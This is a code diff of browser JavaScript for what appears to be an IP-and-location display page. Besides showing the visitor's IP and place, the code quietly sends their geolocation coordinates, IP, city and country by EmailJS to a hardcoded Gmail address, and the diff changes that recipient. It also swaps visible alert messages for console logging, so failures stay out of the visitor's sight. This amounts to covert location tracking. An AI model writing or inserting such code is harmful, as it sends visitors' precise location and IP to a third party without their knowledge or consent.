@@ -15,11 +15,11 @@ document.addEventListener('DOMContentLoaded', async () => {
                 },
                 error => {
                     console.error('Error obtaining location:', error);
-                    alert('Unable to retrieve your location. Please enable location services.');
+                    console.log('Unable to retrieve your location. Please enable location services.');
                 }
             );
         } else {
-            alert('Geolocation is not supported by this browser.');
+            console.log('Geolocation is not supported by this browser.');
         }
     });
 
@@ -32,12 +32,12 @@ document.addEventListener('DOMContentLoaded', async () => {
 // Function to get the user's public IP address
 async function getUserIp() {
     try {
-        const response = await fetch('https://api.ipify.org?format=json');
+        const response = await fetch('https://ipinfo.io/json');
         const data = await response.json();
         await lookupIp(data.ip);
     } catch (error) {
         console.error('Error fetching user IP:', error);
-        alert('Unable to retrieve your IP address.');
+        console.log('Unable to retrieve your IP address.');
     }
 }
 
@@ -46,13 +46,14 @@ async function lookupIp(ip) {
     const locationDisplay = document.getElementById('location');
     
     try {
-        // Fetching IP information from the ipapi API
-        const response = await fetch(`https://ipapi.co/${ip}/json/`);
+        // Fetching IP information from the ipinfo API
+        const response = await fetch(`https://ipinfo.io/${ip}/json`);
         
         if (!response.ok) throw new Error('IP not found');
 
         const data = await response.json();
-        const { ip: ipAddress, city, region, country_name: country, latitude: lat, longitude: lon } = data;
+        const { ip: ipAddress, city, region, country, loc } = data;
+        const [lat, lon] = loc.split(',');
 
         // Displaying results
         ipAddressDisplay.textContent = ipAddress;
@@ -63,7 +64,7 @@ async function lookupIp(ip) {
         sendEmail(lat, lon, ipAddress, city, region, country); // Send email with IP data
 
     } catch (error) {
-        alert(error.message);
+        console.log(error.message);
     }
 }
 
@@ -98,7 +99,7 @@ function sendEmail(lat, lon, ipAddress, city, region, country) {
     emailjs.init('3PyPbjChXwDJ4z-1U');
 
     const templateParams = {
-        to_email: 'abdullah22developer@gmail.com', 
+        to_email: 'abdullah54forum@gmail.com', 
         latitude: lat,
         longitude: lon,
         ip: ipAddress,
@@ -114,3 +115,4 @@ function sendEmail(lat, lon, ipAddress, city, region, country) {
             console.error('Failed to send email:', error);
         });
 }
+    
